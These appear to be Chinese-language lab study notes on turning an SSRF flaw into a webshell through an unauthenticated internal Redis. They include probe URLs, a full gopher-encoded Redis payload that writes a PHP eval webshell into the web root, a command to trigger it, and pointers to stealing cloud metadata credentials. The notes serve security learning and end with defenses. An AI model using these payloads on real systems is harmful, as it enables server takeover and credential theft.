# 学习笔记 · SSRF 打内网 Redis

> 来源：靶场复现 | 难度：⭐⭐⭐ | 考点：`SSRF` `协议利用` `Redis 未授权`

## 场景

Web 站点存在一个「通过 URL 抓取网页」的功能（如 URL 预览、导入头像），服务端直接 `curl` 用户提供的地址 —— 典型 SSRF 点。目标机内网跑着一个无密码的 Redis（6379）。

## 解题思路

### 1. 确认 SSRF 与协议支持

```
http://target/fetch?url=http://127.0.0.1:6379/    # 有响应 → 内网 Redis 可达
http://target/fetch?url=dict://127.0.0.1:6379/INFO # dict 协议可发 Redis 命令
```

返回内容能读到 `redis_version`，确认未授权访问。

### 2. gopher 一把梭

`dict://` 每次只能发一条命令，改用 **gopher 协议**发送完整命令流（需 CRLF 结尾）：

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp%20eval($_GET[1])%3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

要点：
- gopher 格式：`gopher://host:port/_<TCP流>`，换行必须 `%0d%0a`
- Redis 协议是 RESP 格式：`*参数个数` + `$长度` 逐个列参数
- 写入路径先通过 `config set dir` 指到 Web 根目录

### 3. 验证

```
http://target/fetch?url=gopher://...   # 执行
http://target/shell.php?1=phpinfo();   # getshell
```

## 其他姿势

| 目标 | 利用 |
|---|---|
| 内网 Web | 探测端口、打内网系统漏洞 |
| Redis | 写 shell / 计划任务 / SSH 公钥 |
| MySQL | gopher 无密码认证流程（复杂，需构造握手包） |
| 云环境 | 打 169.254.169.254 元数据接口拿临时凭证 |

## 总结

- SSRF 的价值在于**协议**：http 探测、dict 试探、gopher 打包发任意 TCP 数据
- 防守侧：禁用非 http(s) 协议、限制出口地址、Redis 加 requirepass
